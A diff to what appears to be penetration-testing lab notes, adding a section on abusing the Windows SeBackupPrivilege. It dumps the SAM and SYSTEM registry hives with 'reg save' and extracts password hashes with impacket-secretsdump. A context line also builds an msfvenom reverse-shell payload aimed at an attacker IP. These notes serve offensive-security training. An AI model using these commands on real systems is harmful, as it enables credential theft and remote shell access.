@@ -64,3 +64,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe 
 
 
 ### SeBackupPrivilege
+Enumeration** 
+```
+whoami /priv | findstr /i "SeBackupPrivilege"
+```
+
+**Exploitation** 
+
+```cmd prompt:C:/Users/Documents 
+reg save hklm\sam C:\temp\sam.hive
+reg save hklm\system C:\temp\system.hive
+```
+```prompt:htb-student~#
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
